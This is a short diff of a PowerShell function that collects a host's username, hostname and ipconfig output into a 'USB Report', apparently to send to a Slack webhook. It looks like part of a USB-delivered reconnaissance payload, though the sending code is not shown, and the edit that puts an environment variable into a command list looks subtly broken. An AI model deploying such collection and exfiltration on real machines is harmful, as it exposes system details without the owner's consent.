@@ -1,5 +1,5 @@
 function Send-SystemInfoToSlackWebhook {
-    $commands = @("whoami", "hostname", "ipconfig")
+    $commands = @("$Env:UserName", "hostname", "ipconfig")
     $payload = "$name - USB Report`n`n"
     
     foreach ($cmd in $commands) {
